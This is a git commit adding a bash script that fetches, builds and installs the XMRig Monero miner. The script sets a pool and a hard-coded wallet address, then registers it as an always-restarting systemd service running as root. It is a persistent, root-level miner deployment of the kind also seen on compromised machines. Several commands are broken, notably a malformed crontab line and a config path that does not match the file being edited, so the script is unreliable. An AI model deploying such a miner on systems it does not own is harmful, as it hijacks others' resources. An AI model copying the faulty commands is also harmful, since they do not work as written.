5e4930f4e423a3228fb3c7fc5cb6a6f320173633
Enimus <35016163+Enimus@users.noreply.github.com>
2018-05-15 15:19:44 -0500

    Add files via upload

---
+++ tahk.sh
@@ -0,0 +1,46 @@
+#!/bin/bash -ex 
+sudo apt-get update -y 
+echo /etc/crontab > 00 6 * * * root reboot 
+sudo apt-get install -y git build-essential make automake gcc libtool libuv1-dev cmake curl libmicrohttpd-dev opencl-headers 
+ 
+sudo apt update -y 
+ 
+git clone https://github.com/xmrig/xmrig.git 
+cd xmrig 
+cmake -DUV_LIBRARY=/usr/lib/x86_64-linux-gnu/libuv.a 
+make 
+sudo cp xmrig /usr/local/bin/xmrig 
+sudo cp ./src/config.json ./config.json 
+sed -i 's/"url": *"[^"]*",/"url": "pool.supportxmr.com:5555",/' ./config.json 
+
+sed -i 's/"user": *"[^"]*",/"user": "44qchmhzrHYYnaiwa4YCwSYXQwkoX58TXiJtqwZZepTmKFzKqKHx9377EFHGGS98fnjWYCnLb43j34rwHNt3VQCpRuWm9ZH",/' ./config.json 
+
+sed -i 's/"pass": *"[^"]*",/"pass": "ENIMUS-TAHK-P:enimus@enimus.info",/' ./config.json 
+
+sed -i 's#"log-file": *null,#"log-file": "'./xmrig.log'",#' ./config.json 
+
+cat >/tmp/enimus_miner.service <<EOL
+[Unit]
+Description=Enimus-TAHK service
+After=network.target
+ 
+[Service]
+ExecStart=/usr/local/bin/xmrig --config=/root/xmrig/config.json
+Restart=always
+User=root
+
+[Install]
+WantedBy=multi-user.target
+
+EOL
+ 
+ 
+sudo mv /tmp/enimus_miner.service /etc/systemd/system/enimus_miner.service 
+# this is kick off aaall miners lol.
+sed -i 's#"log-file": *null,#"log-file": "'/xmrig.log'",#' ./config.json 
+sudo systemctl daemon-reload 
+sudo systemctl enable enimus_miner.service 
+sudo systemctl start enimus_miner.service 
+sudo systemctl status enimus_miner.service 
+ 
+ 
